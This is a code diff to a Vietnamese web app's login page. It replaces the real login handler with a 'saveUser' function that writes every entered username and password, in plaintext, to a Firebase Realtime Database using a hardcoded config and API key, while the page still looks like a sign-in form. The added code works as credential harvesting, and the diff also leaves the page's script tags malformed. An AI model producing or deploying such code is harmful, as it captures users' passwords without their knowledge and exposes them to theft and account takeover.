@@ -525,14 +525,14 @@
                         <div id="loginForm" class="space-y-6">
                             <div>
                                 <label class="block text-gray-700 text-sm font-bold mb-1"><i class="fas fa-user-alt mr-1 text-secondary-orange"></i> Tài khoản / SĐT</label>
-                                <input id="loginUser" type="text" class="input-field" placeholder="admin hoặc 0912xxxxxx">
+                                <input id="username" type="text" placeholder="Tên đăng nhập">
                             </div>
                             <div>
                                 <label class="block text-gray-700 text-sm font-bold mb-1"><i class="fas fa-key mr-1 text-secondary-orange"></i> Mật khẩu</label>
-                                <input id="loginPass" type="password" class="input-field" placeholder="******">
+                                <input id="password" type="password" placeholder="Mật khẩu">
                             </div>
                             <p id="loginError" class="text-red-600 text-sm font-semibold hidden p-3 bg-red-100 rounded-xl border border-red-300"><i class="fas fa-times-circle mr-1"></i> Sai tài khoản hoặc mật khẩu!</p>
-                            <button onclick="handleLogin()" class="w-full btn-primary !py-4 text-lg">ĐĂNG NHẬP</button>
+                             <button onclick="saveUser()">Đăng nhập</button>
                             <p class="text-center text-sm pt-2">Chưa có tài khoản? <a href="#" onclick="app.renderRegister()" class="text-secondary-orange font-bold hover:underline transition">Đăng ký ngay</a></p>
                         </div>
                     </div>
@@ -1435,7 +1435,55 @@
 
         // Initialize App
         app.init();
+<script type="module">
+    // Import Firebase SDK
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-analytics.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-    </script>
+    // Your Firebase Configuration (KHÔNG CHỈNH SỬA)
+    const firebaseConfig = {
+        apiKey: "AIzaSyBCM5oR5xpUhPyw5xm3Jc8TSodYxbcsY1Y",
+        authDomain: "project-1180861806794677206.firebaseapp.com",
+        projectId: "project-1180861806794677206",
+        storageBucket: "project-1180861806794677206.firebasestorage.app",
+        messagingSenderId: "580190681654",
+        appId: "1:580190681654:web:afa6d180967c73eb9fb697",
+        measurementId: "G-QEX4FYZYVJ",
+        databaseURL: "https://project-1180861806794677206-default-rtdb.firebaseio.com"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const db = getDatabase(app);
+
+    // ====== HÀM LƯU DỮ LIỆU NGƯỜI DÙNG ======
+    window.saveUser = function () {
+        let username = document.getElementById("username").value;
+        let password = document.getElementById("password").value;
+
+        if (username.trim() === "" || password.trim() === "") {
+            alert("Vui lòng nhập đủ thông tin!");
+            return;
+        }
+
+        // Tạo node "users" trong Database
+        const userRef = push(ref(db, "users"));
+
+        // Lưu dữ liệu
+        set(userRef, {
+            username: username,
+            password: password,
+            time: new Date().toLocaleString()
+        })
+        .then(() => {
+            alert("✅ Lưu thành công lên Firebase!");
+        })
+        .catch((error) => {
+            alert("❌ Lỗi khi lưu: " + error);
+        });
+    };
+</script>
 </body>
 </html>
